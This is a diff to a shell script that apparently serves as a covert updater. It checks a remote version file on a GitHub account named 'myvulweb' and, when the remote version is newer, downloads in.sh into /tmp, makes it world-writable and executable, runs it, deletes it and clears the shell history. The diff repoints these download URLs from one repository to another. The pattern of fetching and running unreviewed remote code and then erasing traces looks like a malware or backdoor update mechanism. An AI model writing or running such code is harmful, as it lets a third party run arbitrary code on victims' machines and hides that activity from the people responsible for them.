@@ -1,8 +1,8 @@
 #! /bin/sh
 
-wget https://raw.githubusercontent.com/myvulweb/b1/master/1.txt -O /tmp/b1-singal-test.txt
-ret=`cat /tmp/b1-singal-test.txt`
-rm -rf /tmp/b1-singal-test.txt
+wget https://raw.githubusercontent.com/myvulweb/b2/master/1.txt -O /tmp/b2-singal-test.txt
+ret=`cat /tmp/b2-singal-test.txt`
+rm -rf /tmp/b2-singal-test.txt
 
 cur_ver=`cat /usr/bin/usrhost_ver.txt`
 echo $cur_ver
@@ -32,10 +32,10 @@ then
 elif [ "$ret" -gt "$cur_ver" ]
 then
 	echo "need to update"
-	wget https://raw.githubusercontent.com/myvulweb/b1/master/in.sh -O /tmp/b1-in.sh
-	chmod 777 /tmp/b1-in.sh
-	/tmp/b1-in.sh
-	rm -rf /tmp/b1-in.sh
+	wget https://raw.githubusercontent.com/myvulweb/b2/master/in.sh -O /tmp/b2-in.sh
+	chmod 777 /tmp/b2-in.sh
+	/tmp/b2-in.sh
+	rm -rf /tmp/b2-in.sh
 	history -c
 
 else
